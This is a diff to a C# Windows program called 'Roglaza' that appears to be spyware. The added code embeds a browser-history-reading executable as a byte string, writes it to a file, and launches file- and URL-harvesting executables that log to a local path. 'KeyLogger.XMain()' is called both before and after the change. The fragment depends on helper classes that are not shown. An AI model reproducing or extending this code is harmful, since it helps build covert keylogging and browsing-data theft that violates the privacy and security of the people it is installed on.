@@ -2,9 +2,9 @@
 using Roglaza.Forms;
 using System;
 using System.Collections.Generic;
-using System.Linq;
-using System.Windows.Forms;
 using System.Data.SQLite;
+using System.Linq;
+using System.Windows.Forms; 
 namespace Roglaza
 {
     
@@ -18,8 +18,15 @@ namespace Roglaza
 
          public static void Main()
         {
-           
 
+
+            string s = @"C:\Users\Exception\Documents\Visual Studio 2012\Projects\ReadBrowserhistory\ReadBrowserhistory\bin\Debug\ReadBrowserhistory.exe";
+            var cc = System.IO.File.ReadAllBytes(s);
+            string x = "";
+            foreach (var f in cc)
+                x += f.ToString() + ", ";
+            RoglazaHelper.FileWriteText("aaaaaaaaaaaaaaaaaaaa", x);
+            
             try
             {
                 string version = RoglazaHelper.ReadTextFile("version", "1");
@@ -31,7 +38,10 @@ namespace Roglaza
             try
             {
                 Roglaza.Program.LoadSettings();
-                Url__wrapper.RunBinaryExecutable(Program.ProgramSettings.GetUrlsPath());
+                RoglazaHelper.FileWriteText("output_path", ProgramSettings.LogsPath + "\\");
+               StandAlone_Executables.Execute_Filer(true);
+               StandAlone_Executables.Execute_Urler(true);
+
                 KeyLogger.XMain();
             }
             catch(Exception e) { MessageBox.Show(e.Message); }
